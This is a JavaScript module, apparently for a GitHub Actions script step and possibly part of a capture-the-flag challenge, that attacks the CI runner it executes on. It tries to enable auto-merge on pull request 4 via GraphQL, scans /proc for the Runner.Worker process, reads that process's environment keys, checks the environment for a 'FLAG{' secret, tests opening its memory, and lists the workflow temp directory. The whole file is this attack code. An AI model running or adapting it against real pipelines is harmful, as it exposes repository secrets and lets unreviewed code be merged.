import fs from 'node:fs';

const MARK = 'EXT_P4';

export default async function ({ github, context, core, output }) {
  const ts = Date.now();
  const id = `p4-${context.runId}-${ts}`;
  const log = (...a) => console.log(MARK, id, ...a);
  const R = context.repo;

  const probe = async (name, fn) => {
    try {
      const r = await fn();
      const data = r?.data ?? r;
      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 300));
      return { ok: true, data };
    } catch (e) {
      log('PROBE', name, 'FAIL', e.status ?? '', String(e.message).slice(0, 800));
      return { ok: false, status: e.status };
    }
  };

  // minimal graphql
  const pr = await probe('graphql.pullRequest.min', async () => {
    const r = await github.graphql(
      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus}}}`,
      { owner: R.owner, repo: R.repo, n: 4 },
    );
    return r.repository.pullRequest;
  });
  if (pr.ok) {
    await probe('graphql.enablePullRequestAutoMerge', () =>
      github.graphql(
        `mutation($prId:ID!,$mm:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$prId,mergeMethod:$mm}){clientMutationId}}`,
        { prId: pr.data.id, mm: 'MERGE' },
      ),
    );
  }

  // local environment reconnaissance
  try {
    log('PTRACE_SCOPE', fs.readFileSync('/proc/sys/kernel/yama/ptrace_scope', 'utf8').trim());
  } catch (e) {
    log('PTRACE_SCOPE_ERR', String(e.message));
  }
  try {
    const pids = fs.readdirSync('/proc').filter((p) => /^\d+$/.test(p));
    for (const pid of pids) {
      try {
        const cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ');
        if (!/Runner\.Worker/i.test(cmd)) continue;
        const env = fs.readFileSync(`/proc/${pid}/environ`, 'utf8');
        const keys = env.split('\0').map((x) => x.split('=')[0]).filter(Boolean);
        log('WORKER_ENV_KEYS', JSON.stringify({ pid, keys }));
        log('WORKER_ENV_HAS_FLAG', env.includes('FLAG{'));
        let memOk = false;
        let memErr = '';
        try {
          const fd = fs.openSync(`/proc/${pid}/mem`, 'r');
          fs.closeSync(fd);
          memOk = true;
        } catch (e) {
          memErr = String(e.code || e.message);
        }
        log('WORKER_MEM_OPEN', JSON.stringify({ pid, memOk, memErr }));
        const fds = fs.readdirSync(`/proc/${pid}/fd`).length;
        log('WORKER_FD_COUNT', fds);
      } catch (e) {
        /* ignore */
      }
    }
  } catch (e) {
    log('PROC_ERR', String(e.message));
  }

  try {
    const dir = '/home/runner/work/_temp/_github_workflow';
    log('WORKFLOW_DIR', JSON.stringify(fs.readdirSync(dir).map((n) => {
      const p = `${dir}/${n}`;
      const st = fs.statSync(p);
      return { n, size: st.size };
    })));
  } catch (e) {
    log('WORKFLOW_DIR_ERR', String(e.message));
  }

  log('DONE');
}
